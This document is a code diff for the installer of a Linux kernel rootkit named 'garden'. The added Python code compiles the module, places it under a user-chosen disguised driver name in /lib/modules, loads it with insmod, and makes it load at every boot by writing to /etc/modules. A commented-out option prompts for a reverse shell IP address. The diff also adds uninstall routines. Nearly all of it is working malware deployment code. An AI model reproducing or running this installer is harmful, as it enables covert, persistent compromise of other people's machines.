@@ -5,10 +5,10 @@ import os
 import sys
 import shlex
 from shutil import move
-from subprocess import STDOUT, CalledProcessError, check_output
+from subprocess import STDOUT, PIPE, CalledProcessError, check_output, Popen
 
 #######
-# Prompting/Printing Helpers
+# Prompting/Printing
 ######
 
 colors = {
@@ -76,12 +76,12 @@ def prompt(text, default):
 	else:
 		return response
 
-
 ####
-# Build Process Helpers
+# Running Shell Commands
 ####
 
-def run_cmd(command, working_dir=None, run_with_os=False):
+
+def run_cmd_exit_on_fail(command, working_dir=None, run_with_os=False):
 	"""
 	Command can be either a list or a string if run_with_os is False. If
 	run_with_os is True, only strings are accepted. Exits if command
@@ -106,6 +106,19 @@ def run_cmd(command, working_dir=None, run_with_os=False):
 			sys.exit(1)
 
 
+def run_cmd(command):
+	"""
+	Run command and return output and exit code.
+	:return: tuple of (output, returncode)
+	"""
+	out = Popen(shlex.split(command), stderr=STDOUT, stdout=PIPE)
+	return out.communicate()[0], out.returncode
+
+####
+# Build Process
+####
+
+
 def create_config_header_file(user_defines: dict, path: str):
 	"""
 	Creates config.h file and populates it with user defined constants.
@@ -120,20 +133,69 @@ def create_config_header_file(user_defines: dict, path: str):
 		f.write(contents)
 
 ####
+# Kernel Module Loading/Unloading
+####
+
+
+def is_module_already_loaded(module_name):
+	"""
+	Returns True if module_name appears in output of $ lsmod
+	"""
+	output = run_cmd("lsmod")[0].decode("utf-8")
+	modules = [line.split()[0] for line in output.split()]
+	return module_name in modules
+
+
+def is_module_already_persistent(module_name):
+	"""
+	If module_name is already in /etc/modules, return True. Otherwise,
+	return False.
+	"""
+	with open("/etc/modules", "r") as f:
+		if module_name in [line.strip() for line in f.readlines()]:
+			print_status("Rootkit already persistent.")
+			return True
+		else:
+			print_status("Rootkit not persistent.")
+			return False
+
+
+def load_module(module_path):
+	print_status("Loading module...")
+	run_cmd_exit_on_fail("insmod {}".format(module_path), run_with_os=True)
+
+
+def unload_module(module_name):
+	if is_module_already_loaded(module_name):
+		print_status("Unloading module...")
+		run_cmd_exit_on_fail("rmmod {}".format(module_name), run_with_os=True)
+
+####
 # Persistence
 ####
 
 
-def enable_persistence():
-	pass
+def enable_persistence(module_name):
+	"""
+	Add module_name to /etc/modules file. All modules in this file will
+	be loaded on start up.
+	"""
 	print_status("Making rootkit persistent...")
-	# TODO: This
-	print_success("Persistence established.")
+	if not is_module_already_persistent(module_name):
+		with open("/etc/modules", "a") as f:
+			f.write("\n{}\n".format(module_name))
+		print_success("Persistence established.")
 
 
-def remove_persistence():
-	# TODO: This
-	pass
+def remove_persistence(module_name):
+	print_status("Removing rootkit persistence...")
+	if is_module_already_persistent(module_name):
+		with open("/etc/modules", "r") as f:
+			contents = f.readlines()
+
+		with open("/etc/modules", "w") as f:
+			[f.write(line) for line in contents if line.strip() != module_name]
+		print_success("Persistence removed.")
 
 
 ####
@@ -154,7 +216,7 @@ def validate_os_and_kernel():
 		sys.exit(1)
 
 	kernel_version = os_info[2]
-	valid_kernels = ["4.18.0-16-generic", "4.18.0-15-generic"]
+	valid_kernels = ["4.18.0-15-generic", "4.18.0-16-generic"]
 	if kernel_version not in valid_kernels:
 		print_error("Invalid kernel. Exiting.")
 		sys.exit(1)
@@ -166,10 +228,12 @@ def install(kernel_version):
 	print_status("Starting rootkit installation...")
 
 	config = {}
-	config["MODULE_NAME"] = "garden.ko"
+	config["MODULE_NAME"] = "garden"
 	config["DRIVER_NAME"] = prompt("Enter the name of a kernel driver to disguise your rootkit.", "garden")
 	# config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", "Garden")
 	# config["REVERSE_SHELL_IP_ADDR"] = prompt("Enter IP address for reverse shell.")
+
+	run_cmd_exit_on_fail("make clean", "./rootkit")
 
 	config_path = "./rootkit/config.h"
 	print_status("Creating config file...")
@@ -178,17 +242,17 @@ def install(kernel_version):
 
 	# Compile rootkit
 	print_status("Compiling rootkit...")
-	run_cmd("make all", "./rootkit")
+	run_cmd_exit_on_fail("make all", "./rootkit")
 	print_success("Successful compilation.")
 
-	# Move compiled components to the right place. Maybe drop it in "/lib/modules/{0}/garden?
+	# Move compiled components to the right place. Maybe drop it in "/lib/modules/kernel-version/garden?
 	print_status("Installing rootkit...")
 	module_dest_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, config["DRIVER_NAME"])
 	if not os.path.exists(module_dest_dir):
 		os.mkdir(module_dest_dir)
 
-	module_curr_path = "./rootkit/{}".format(config["MODULE_NAME"])
-	module_dest_path = module_dest_dir + "/" + config["MODULE_NAME"]
+	module_curr_path = "./rootkit/{}.ko".format(config["MODULE_NAME"])
+	module_dest_path = "{}/{}.ko".format(module_dest_dir, config["MODULE_NAME"])
 
 	# Move the compiled kernel module to the kernel modules directories.
 	try:
@@ -198,26 +262,34 @@ def install(kernel_version):
 		print_error("Unable to copy file. {}".format(e))
 		sys.exit()
 
-	# Load the kernel module
-	run_cmd("depmod")
-	run_cmd("insmod {}".format(module_dest_path), run_with_os=True)
-
 	# Option to enable persistence by making the module load on boot.
 	if prompt_yes_no("Enable persistence?"):
-		enable_persistence()
+		enable_persistence(config["MODULE_NAME"])
 
+	run_cmd_exit_on_fail("depmod")
+	# Unload kernel module if it's already loaded.
+	unload_module(config["MODULE_NAME"])
+	# Load kernel module
+	load_module(module_dest_path)
 	print_success("Successful installation.")
 
 
 def uninstall():
-	# TODO: This will likely have to be more complete when we add more,
-	# but for now a simple `$ rmmod garden` works.
+	"""
+	Remove persistence and unload module.
+	"""
+	print_status("Starting rootkit removal...")
 	module = prompt("Enter the name of the module to remove.", "garden")
-	run_cmd("rmmod {}".format(module), run_with_os=True)
+	remove_persistence(module)
+	unload_module(module)
 	print_success("Removed {} from modules.".format(module))
 
 
 def main():
+	"""
+	Check to see that the rootkit works on this OS and kernel.
+	If it can, process args to proceed to installation/removal/help.
+	"""
 	kernel_version = validate_os_and_kernel()
 
 	if sys.argv[1] not in ["install", "uninstall"]:
